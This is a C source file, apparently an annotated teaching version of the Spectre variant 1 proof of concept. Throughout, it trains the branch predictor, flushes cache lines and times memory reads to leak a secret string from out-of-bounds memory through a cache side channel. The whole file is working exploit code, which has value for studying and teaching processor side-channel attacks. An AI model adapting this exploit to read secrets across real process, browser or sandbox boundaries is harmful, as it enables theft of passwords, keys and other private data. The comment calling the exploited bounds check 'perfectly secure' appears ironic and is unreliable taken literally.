#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h> /* for rdtscp and clflush */

/* Annotated and simplified code to demonstrate Spectre vulnerability of
 * Macbook Pros. This is a result of refactoring and commenting the code found
 * in Spectre paper (https://spectreattack.com/spectre.pdf). This code will
 * make sense only after Spectre paper is understood.
 *
 * Compile on Macbook Pro: gcc -o annotated_meltdown ./annotated_meltdown.cpp
 *
 * Author: Amrut Joshi (amrut.joshi@gmail.com) */

#define PARTITION_SIZE (1024 * 4)
#define ARRAY_SIZE (16)

unsigned int array_size = ARRAY_SIZE;

/* Secret is transmitted from secure code that reads this array */
uint8_t array[ARRAY_SIZE] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };

/* Not sure why this is used, but exploit stops working if this is removed */
uint8_t unused[64];

/* This secret will be trasmitted on the covert channel */
char *secret = "Annotated Spectre code by Amrut Joshi.";

/*
 * This array is used only to read and it will always have garbage values.
 * When any location in array is read, the value will be cached in CPU cache.
 *
 * Values in the array are of no importance. The indices are the ones
 * that are used to leak information.
 *
 * If sender of covert channel wants to transmit 'n', it reads partitions[n * PARTITION_SIZE].
 * This caches the value at this location. Now, receiver reads partitions[(1..256) * PARTITION_SIZE]
 * and measures the time taken to read each value. Let's say partitions[m * PARTITION_SIZE] was the
 * fastest read, it tells receiver that mth partition is cached and thus m is the value
 * transmitted
*/

uint8_t partitions[256 * PARTITION_SIZE];

uint8_t temp = 0; /* Used so compiler won't optimize out transmit_byte() */

void inline transmit_byte(size_t x)
{
    /* I guess that this increases chances of slowing the condition execution
     * by putting a dependency on array_size which will be fetched from memory
     * instead of cache */
    _mm_clflush(&array_size);

    /* if x is greater than array_size "if" body is speculatively executed
     * because branch predictor is trained. array[x] is *(array + x) so if
     * we know distance of start of secret from array start and use that as x
     * then *(array + x) = first byte of secret.
     *
     * partitions is partitioned in 256 chunks, each of PARTITION_SIZE bytes. so if first
     * byte of secret is n then partitions[n * PARTITION_SIZE] read nth partition. When is
     * partition is read, cache line for nth partion is reloaded.
     *
     * When CPU figures out that x is greater than array_size, it throws away
     * the result of if body but cache line still remains reloaded.
     *
     * so if we watch all cache line after this function returns and find only
     * nth cache line reloaded then we know that first byte of secret is n.
     *
     * Note: This code is perfectly secure! */

    if (x < array_size) {
        temp &= partitions[array[x] * PARTITION_SIZE];
    }
}

void inline flush_cache()
{
    /* Flush partitions[256*(0..255)] from cache */
    for (int i = 0; i < 256; i++)
        _mm_clflush(&partitions[i * PARTITION_SIZE]); /* intrinsic for clflush instruction */
}

#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
void inline receive_bytes(unsigned char *aggregated_results)
{
    int i;
    volatile uint8_t *addr;
    register uint64_t initial_time, read_time_duration;
    unsigned int junk = 0; // int was not working - @mkagenius

    /* Read all 256 partitions in partitions and measure the time. If time is less
     * than or equal to CACHE_HIT_THRESHOLD then we consider it as cache hit.
     * */
    for (i = 0; i < 256; i++) {
        // Address of partition
        addr = &partitions[i * PARTITION_SIZE];
        // Initial time stamp
        initial_time = __rdtscp(&junk);
        // Read partition causing cache reload */
        junk = *addr;
        // Calculate read duration
        read_time_duration = __rdtscp(&junk) - initial_time;
        // Increment aggregated_results if its a cache hit
        if (read_time_duration <= CACHE_HIT_THRESHOLD)
            aggregated_results[i]++;
    }
}

/* Takes aggregated results and returns top two */
void best_results(unsigned char aggregated_results[256], uint8_t value[2], int score[2])
{
    int i, best, second_best = 0;
    /* Locate highest & second-highest results results tallies in best/second_best */
    best = second_best = -1;
    for (i = 0; i < 256; i++) {
        if (best < 0 || aggregated_results[i] >= aggregated_results[best]) {
            second_best = best;
            best = i;
        } else if (second_best < 0 || aggregated_results[i] >= aggregated_results[second_best]) {
            second_best = i;
        }
    }
    value[0] = (uint8_t)best;
    score[0] = aggregated_results[best];
    value[1] = (uint8_t)second_best;
    score[1] = aggregated_results[second_best];
}

#define TRAINING_RUNS (5)
/* Trains branch predictor and transmits a byte at (array + malicious_x)
 * location */
void inline train_and_transmit(size_t training_x, size_t malicious_x)
{
    size_t x;

    /* Train branch predictor by calling the transmit_byte few
     * times which legally reads the array. Once BP is trained, we start
     * calling transmit_byte with malicious values. Since BP is trained to
     * take the branch, it reads illegal values. */

    for (int j = 0; j <= (TRAINING_RUNS * 6); j++) {

        for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */

        /* Following can be written as:
         * if (j < TRAINING_RUNS) {
         *     x = training_x;
         * } else {
         *     x = malicious_x;
         * }
         * But using if/else may mess up branch predictor, bit magic
         * is to do the same. */

        x = ((j % (TRAINING_RUNS + 1)) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
        x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
        x = training_x ^ (x & (malicious_x ^ training_x));

        /* transmit a byte. byte transmitted is value at array[x].*/
        transmit_byte(x);

    }
}

/* Report best guess in value[0] and runner-up in value[1] */
void transmit_and_receive(size_t malicious_x, uint8_t value[2], int score[2]) {
    int tries, i = 0;
    unsigned char aggregated_results[256];

    /* Initialize aggregated_results */
    for (i = 0; i < 256; i++)
        aggregated_results[i] = 0;

    /* We transmit and receive bytes 99 times and based on all the results
     * return the value that has been read most number of times */
    for (tries = 99; tries > 0; tries--) {

        /* Step 1: flush cache */
        flush_cache();

        /* Step 2: train and transmit */
        train_and_transmit(tries % ARRAY_SIZE, malicious_x);

        /* Step 3: Receive transmitted byte. This is probabilistic.
         * If receiver thinks that received value could be 13 or 14
         * then it increases aggregated_results[13] and aggregated_results[14]
         * by 1. */
        receive_bytes(aggregated_results);
    }

    /* Return the two best results */
    return best_results(aggregated_results, value, score);
}

int main(int argc, const char **argv)
{
    /* array[malicious_x] is the first first byte of secret */
    size_t malicious_x=(size_t)(secret-(char*)array);
    int i, score[2], len;
    uint8_t value[2];

    /* Write to partitions so in RAM not copy-on-write zero pages */
    for (i = 0; i < sizeof(partitions); i++) {
        partitions[i] = 1;
    }

    len = strlen(secret);
    printf("Reading %d bytes:\n", len);

    for (i = 0; i < len; i++) {
        printf("Reading at malicious_x = %p... ", (void*)malicious_x);

        /* Send and receive byte */
        transmit_and_receive(malicious_x + i, value, score);

        /* Success is if best result is twice the second best */
        printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));

        /* Print the best result */
        printf("0x%02X='%c' score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);

        /* Print the second best result */
        if (score[1] > 0)
            printf("(second best: 0x%02X score=%d)", value[1], score[1]);

        printf("\n");
    }
    return 0;
}
